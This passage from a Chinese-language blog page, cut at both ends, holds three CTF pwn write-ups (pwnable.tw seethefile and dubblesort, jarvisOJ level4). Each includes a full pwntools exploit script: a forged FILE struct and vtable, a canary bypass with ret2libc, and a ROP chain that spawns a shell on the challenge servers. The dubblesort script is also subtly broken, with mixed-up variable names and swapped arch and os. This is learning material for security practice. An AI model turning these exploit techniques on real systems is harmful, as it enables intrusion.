class="line">  <span class="keyword">char</span>* _IO_write_ptr;    <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;    <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;    <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span></span><br><span class="line">  _IO_off64_t _offset;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="keyword">void</span> *_freeres_buf;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">void</span> *__pad1;</span><br><span class="line">  <span class="keyword">void</span> *__pad2;</span><br><span class="line">  <span class="keyword">void</span> *__pad3;</span><br><span class="line">  <span class="keyword">void</span> *__pad4;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">size_t</span> __pad5;</span><br><span class="line">  <span class="keyword">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don't get into trouble again.  */</span></span><br><span class="line">  <span class="keyword">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="keyword">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="keyword">void</span> *) - <span class="keyword">sizeof</span> (<span class="keyword">size_t</span>)];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> _<span class="title">IO_2_1_stdin_</span>;</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> _<span class="title">IO_2_1_stdout_</span>;</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> _<span class="title">IO_2_1_stderr_</span>;</span></span><br></pre></td></tr></table></figure><p></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* We always allocate an extra word following an _IO_FILE.</span></span><br><span class="line"><span class="comment">   This contains a pointer to the function jump table used.</span></span><br><span class="line"><span class="comment">   This is for compatibility with C++ streambuf; the word can</span></span><br><span class="line"><span class="comment">   be used to smash to a pointer to a virtual function table. */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> *_<span class="title">IO_list_all</span>;</span></span><br></pre></td></tr></table></figure><p>这里伪造结构体的时候有一些关键的点需要注意:</p><ol><li>IO_FILE结构体偏移0x34的地方即_chain字段指向的也是一个FILE结构，我们可以使用_IO_2_1_stderr_，_IO_2_1_stderr_，_IO_2_1_stdout_或者，也可以使用自己的FILE结构体地址(不过实测发现stderr不可以,猜测里面用到了read和write但是没有setbuf(stderr)，即这个流没打开，不过正常应该这仨都是自动打开的才是Orz)</li><li>位于0x48偏移的_lock必须指向一个为NULL的空间，因此我们可以用\x00填充name,在这里填name的地址</li><li>_vtable_offset要为0，其位于0x46处且只占一个字节</li><li>其余部分是0或者0xffffffff按照未溢出前正常fp结构体的分布来写</li><li>vatable的前两个地址为NULL</li><li>close函数覆写为system，函数执行的时候的参数为fp，故可以将fp的开头改为/bin/sh\x00，即可让fclose(fp)变为syetm(fake_fp),fake_fp-&gt;/bin/sh\x00</li></ol><p>综上所述最终的payload结构如下:</p><h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">context.update(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">elf = ELF(<span class="string">'./seethefile'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    sh = process(<span class="string">'./seethefile'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = remote(<span class="string">'chall.pwnable.tw'</span>,<span class="number">10200</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">fp_addr = <span class="number">0x0804B280</span></span><br><span class="line">sh.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'What do you want to see :'</span>)</span><br><span class="line">sh.sendline(<span class="string">'/proc/self/maps'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">sh.sendline(<span class="string">'3'</span>)</span><br><span class="line"><span class="comment">##get libc base addr</span></span><br><span class="line">sh.recvline(<span class="number">1</span>)</span><br><span class="line">libc_addr = int(sh.recvuntil(<span class="string">'-'</span>)[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">'libc base addr =&gt; '</span> + hex(libc_addr))</span><br><span class="line"><span class="comment">#shell_addr = libc_addr + 0x5f065</span></span><br><span class="line">shell_addr = libc_addr + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">sh.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">sh.sendline(<span class="string">'5'</span>)</span><br><span class="line"><span class="comment">##</span></span><br><span class="line">sh.recvuntil(<span class="string">'Leave your name :'</span>)</span><br><span class="line">vtable_addr = fp_addr+<span class="number">0x94</span></span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0x20</span></span><br><span class="line">payload +=  p32(<span class="number">0x0804B284</span>)</span><br><span class="line">payload += <span class="string">'/bin/sh\x00'</span></span><br><span class="line">payload += p32(<span class="number">0</span>)*<span class="number">11</span><span class="comment">#9</span></span><br><span class="line">payload += p32(libc_addr+libc.symbols[<span class="string">'_IO_2_1_stdin_'</span>])<span class="comment">#1</span></span><br><span class="line"><span class="comment">#payload += p32(0x0804b284)</span></span><br><span class="line">payload += p32(<span class="number">3</span>)+p32(<span class="number">0</span>)*<span class="number">3</span> + p32(<span class="number">0x0804b260</span>)<span class="comment">#6</span></span><br><span class="line">payload += p32(<span class="number">0xffffffff</span>)*<span class="number">2</span><span class="comment">#3</span></span><br><span class="line">payload += p32(<span class="number">0</span>) * <span class="number">16</span><span class="comment">#14</span></span><br><span class="line">payload += p32(fp_addr+len(payload)+<span class="number">4</span><span class="number">-0x20</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)*<span class="number">2</span> + p32(<span class="number">0</span>) * <span class="number">15</span> + p32(shell_addr) + p32(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">sh.sendline(payload) </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></div><footer class="post-footer"><div class="post-eof"></div></footer></div></article><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/25/dubblesort/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="ama2in9"><meta itemprop="description" content="Talking is cheap, show me the code."><meta itemprop="image" content="/images/head.png"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Ama2in9"></span><header class="post-header"><h1 class="post-title" itemprop="name headline"> <a class="post-title-link" href="/2018/11/25/dubblesort/" itemprop="url">dubblesort</a></h1><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i></span> <span class="post-meta-item-text">Posted on</span> <time title="Created: 2018-11-25 16:51:59" itemprop="dateCreated datePublished" datetime="2018-11-25T16:51:59+08:00">2018-11-25</time></span> <span class="post-category"><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-folder-o"></i></span> <span class="post-meta-item-text">In</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/pwnable-tw/" itemprop="url" rel="index"><span itemprop="name">pwnable.tw</span></a></span></span> <span class="post-comments-count"><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-comment-o"></i></span><a href="/2018/11/25/dubblesort/#comments" itemprop="discussionUrl"><span class="post-comments-count disqus-comment-count" data-disqus-identifier="2018/11/25/dubblesort/" itemprop="commentCount"></span></a></span> <span id="/2018/11/25/dubblesort/" class="leancloud_visitors" data-flag-title="dubblesort"><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-eye"></i></span> <span class="post-meta-item-text">Views:</span><span class="leancloud-visitors-count"></span></span></div></header><div class="post-body" itemprop="articleBody"><p>#<br>pwnable.tw/dubblesort</p><p>##<br>简介</p><p>这是写的第一篇writeup。虽然学了将近一个月pwn，但是还是不得要领，之所以要写这个的writeup，是因为这个很典型，中间用到了绕过canary以及尝试的过程，加上工具的使用，有很强的借鉴意义。</p><p>程序比较简单，放到IDA里F5，得到C代码，默认命名辨识度低，把一些重要变量重命名成易于记忆的名字，main函数里<br><img src="/2018/11/25/dubblesort/1.jpg" alt="first_entry"><br>其中canary的值不能发生变化，首先尝试输入amazing，发现输出的除了名字之后还有一些乱码，这是因为read读取的输入以换行结束，并不包含\x00，而printf输出的结束符为\x00，因此在输出名字之后还会继续向后输出，直到’\0’为止。这里是一个可以泄露栈内容的漏洞<br><img src="/2018/11/25/dubblesort/2.jpg" alt="first_try"><br>继续往下测试，发现这是一个对输入数字进行从小到大排序的程序，问题在于它并没有限制输入数字的数量，这就导致用户输入过长时产生栈溢出，在IDA中可以看到程序内部并没有system函数和’/bin/sh’，因此要从动态链接库里找，即构造ret2libc，gdb调试程序,在puts处下断点，输入4个数字，分别为1，2，3，4，在栈上的输入点为[esp+0x5c]，距离ebp的距离为0x7c,因此栈结构设计如下:<br><img src="/2018/11/25/dubblesort/4.jpg" alt="stack"><br>checksec ./dubblesort可以看到栈开启了各种保护，因为不是直接在栈上布置shellcode所以NX的保护没关系，FULL RELRO表示程序开始的时候会动态加载函数表，不能通过替换got表来执行恶意代码，最重要的是PIE和Canary，IDA里可以看到canary和输入点间的距离是0x60，在gdb中验证之后确实也如此<br><img src="/2018/11/25/dubblesort/5.jpg" alt="checksec"><br><img src="/2018/11/25/dubblesort/6.jpg" alt="canary_position"><br>最后的栈结构如下：<br><img src="/2018/11/25/dubblesort/7.jpg" alt="stack_with_canary"></p><p>##<br>漏洞利用</p><p>###<br>绕过canary</p><p>漏洞还是蛮容易找到的，但是对于我这个菜鸡来说各种保护实在是太难绕过了，脚本也不熟，只能一点点尝试。首先canary上的值不能变，目前遇到的可以绕过canary的方法就是地址任意写，在这里我们要覆盖连续的栈空间，这条路走不通，只能是想方法不写到这块地址上，继续尝试输入，发现输入数字为f等非数字时直接停止之后的输入，直接输入结果，gdb调试发现此时栈上的内容没有发生变化，这是因为以%d格式读取字符时发生格式错误，输入无法写入到栈上，但是没有清空缓存区的函数，这个字符就一直留在缓冲区，之后读取都会发生错误，最终的结果就是这次输入之后的结果都无法写入到栈上，这样我们似乎可以通过输入字符绕过canary，但是此后的输入也无法写到栈上，因此要尝试新的输入，最后尝试到’-‘发现为合法输入，但是不写到栈上，正好满足了我们的需求，因此我们前24个输入填充0，第25位输入’+’绕过保护，再填充比canary值大的数，这是因为之后的排序是从小到大排序，直接对整数指针操作，因此我们要保证canary值位置不变，必须按照递增顺序放置元素，在这里我们使用system函数的地址，因为这个地址大部分时间都大于canary的随机数，一直覆盖到ebp,共7个填充，加上最后覆盖的返回地址共8个system_addr</p><p>###<br>绕过PIE</p><p>绕过PIE的题还没见过，之前学习中讲的是要找到不变的部分，只能gdb慢慢找了。name那里之前提了一个漏洞，可以泄露栈上内容，当然之前说的在输入数字时不改变栈内容也可以泄露内容，但是canary必然会被破坏，因此我们最好利用read泄露地址,查看之后可以看到0xf7fb2000这个值似乎不随输入变化，而且vmmap查看发现这的确是动态链接库的地址,减去起始位置的距离发现偏移量为0x1b0000，使用readelf命令发现这个地址对应的got.plt地址，这样我们就得到了一个固定的got地址，最后，由于printf遇到’\x0’会停止输出，而这个地址最后总为’\0’，因此使用换行符覆盖最后一位，得到的leak地址再减去0x0a即可。<br><img src="/2018/11/25/dubblesort/9.jpg" alt="find addr"><br><img src="/2018/11/25/dubblesort/10.jpg" alt="find_offset"></p><p>##<br>payload.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.update(arch=&apos;linux&apos;,os=&apos;i386&apos;)</span><br><span class="line">context.log_level = &apos;DEBUG&apos;</span><br><span class="line">debug = 0</span><br><span class="line">if debug:</span><br><span class="line">    pc = process(&apos;./dubblesort&apos;)</span><br><span class="line">else:</span><br><span class="line">    pc = remote(&apos;chall.pwnable.tw&apos;, 10101)</span><br><span class="line"></span><br><span class="line">got_off = 0x1b0000</span><br><span class="line">libc = ELF(&apos;./libc_32.so.6&apos;)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(&apos;a&apos;*24)</span><br><span class="line">got_addr = u32(p.recv()[30:34])-0xa</span><br><span class="line">libc_addr = got_addr-got_off</span><br><span class="line">system_addr = libc_addr + libc.symbols[&apos;system&apos;]</span><br><span class="line">bin_sh_addr = libc_addr + libc.search(&apos;/bin/sh&apos;).next()</span><br><span class="line">p.sendline(&apos;35&apos;)</span><br><span class="line">p.recv()</span><br><span class="line">for i in range(24):</span><br><span class="line">    p.sendline(&apos;0&apos;)</span><br><span class="line">    p.recv()</span><br><span class="line">p.sendline(&apos;+&apos;)</span><br><span class="line">p.recv()</span><br><span class="line">for i in range(9):</span><br><span class="line">    p.sendline(str(system_addr))</span><br><span class="line">    p.recv()</span><br><span class="line">p.sendline(str(bin_sh_addr))</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><footer class="post-footer"><div class="post-eof"></div></footer></div></article><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/25/jarvisOj-level4/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="ama2in9"><meta itemprop="description" content="Talking is cheap, show me the code."><meta itemprop="image" content="/images/head.png"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Ama2in9"></span><header class="post-header"><h1 class="post-title" itemprop="name headline"> <a class="post-title-link" href="/2018/11/25/jarvisOj-level4/" itemprop="url">jarvisOj-level4</a></h1><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i></span> <span class="post-meta-item-text">Posted on</span> <time title="Created: 2018-11-25 16:42:46" itemprop="dateCreated datePublished" datetime="2018-11-25T16:42:46+08:00">2018-11-25</time></span> <span class="post-category"><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-folder-o"></i></span> <span class="post-meta-item-text">In</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/jarvisOj/" itemprop="url" rel="index"><span itemprop="name">jarvisOj</span></a></span></span> <span class="post-comments-count"><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-comment-o"></i></span><a href="/2018/11/25/jarvisOj-level4/#comments" itemprop="discussionUrl"><span class="post-comments-count disqus-comment-count" data-disqus-identifier="2018/11/25/jarvisOj-level4/" itemprop="commentCount"></span></a></span> <span id="/2018/11/25/jarvisOj-level4/" class="leancloud_visitors" data-flag-title="jarvisOj-level4"><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-eye"></i></span> <span class="post-meta-item-text">Views:</span><span class="leancloud-visitors-count"></span></span></div></header><div class="post-body" itemprop="articleBody"><h1 id="jarvis-gt-level4"><a href="#jarvis-gt-level4" class="headerlink" title="jarvis-&gt;level4"></a>jarvis-&gt;level4</h1><h2 id="代码逻辑"><a href="#代码逻辑" class="headerlink" title="代码逻辑"></a>代码逻辑</h2><p>程序本身很简单，使用F5转换成C代码，有一个vlunerable_function(),里面是很明显的栈溢出</p><p><img src="/2018/11/25/jarvisOj-level4/1.jpg" alt="code"><br><img src="/2018/11/25/jarvisOj-level4/2.jpg" alt="code2"></p><p>查看程序的保护措施，发现只有栈不可执行保护，这意味着不能在栈上执行代码。</p><p><img src="/2018/11/25/jarvisOj-level4/3.jpg" alt="protection"></p><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>整体的思路比较简单，溢出之后在return addr填上system函数地址，之后跟fake ebp和’/bin/sh’的地址即可，但是在调试过程中发现程序中并没有现成的地址，因此要想办法自己获取Libc中的地址</p><p><img src="/2018/11/25/jarvisOj-level4/4.jpg" alt="info"></p><p>由于题目中没有给libc，我开始使用的是一个库Libcsearcher，基于libcdatabase，但是事实证明不太好使，找不到对应的libc，也可能是我使用姿势不对，之后想到用pwntools自带的DynELF配合leak得到system函数的地址，之后使用read将’/bin/sh’写入.bss段中，调用system(‘.bss_addr’)即可拿到shell</p><p>代码里的leak函数是使用一种持续化泄露函数地址的方式讲指定的address输出出来，借此找到libc,后面的payload是使用read从用户输入中获取’/bin/sh’，之后三个pop将栈里的read三个参数都弹出栈，到ret的时候esp就是system_addr，它的参数是bss段的地址(可以用IDA查看)</p><h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"info"</span>)</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./level4'</span>)</span><br><span class="line"><span class="comment">#libc = ELF('/lib/i386-linux-gnu/libc.so.6')</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    sh = process(<span class="string">'./level4'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9880</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">    padding = <span class="string">'A'</span> * <span class="number">0x8c</span></span><br><span class="line">    write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">    vulnearbale_addr = elf.symbols[<span class="string">'vulnerable_function'</span>]</span><br><span class="line">    payload = padding + p32(write_plt) + p32(vulnearbale_addr) + p32(<span class="number">1</span>) + p32(address) + p32(<span class="number">4</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    data = sh.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"%x =&gt; %s"</span> % (address, (data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">d = DynELF(leak,elf=ELF(<span class="string">'./level4'</span>))</span><br><span class="line">system_addr = d.lookup(<span class="string">"system"</span>,<span class="string">"libc"</span>)</span><br><span class="line">bss_addr = <span class="number">0x0804A024</span></span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">pop_ret = <span class="number">0x08048509</span></span><br><span class="line">padding = <span class="string">'A'</span>*<span class="number">0x8C</span></span><br><span class="line">vulnearbale_addr = elf.symbols[<span class="string">'vulnerable_function'</span>]</span><br><span class="line">payload = padding + p32(read_plt) + p32(pop_ret) +p32(<span class="number">0</span>) + p32(bss_addr)\</span><br><span class="line">        + p32(<span class="number">8</span>) + p32(system_addr) + p32(vulnearbale_addr) +p32(bss_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">sh.interactive()</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></div><footer class="post-footer"><div class="post-eof"></div></footer></div></article><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link 